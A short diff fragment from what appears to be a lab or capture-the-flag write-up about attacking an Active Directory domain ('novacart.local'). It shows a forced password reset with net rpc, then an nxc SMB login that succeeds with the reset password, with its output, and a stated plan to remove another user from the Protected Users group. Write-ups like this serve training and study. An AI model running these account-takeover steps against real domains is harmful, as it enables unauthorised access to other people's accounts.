@@ -1473,5 +1473,9 @@ net rpc password "l.forta" 'Password123!' -U "novacart.local"/"cliff.b"%'Passwor
 This has reset the password
 
 ```python
-
+nxc smb dc.novacart.local -u l.forta -p 'Password123!'                                         
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\l.forta:Password123!
 ```
+Now this user is compromised i can work on removing the user `m.ibabao` from the protected users group
+
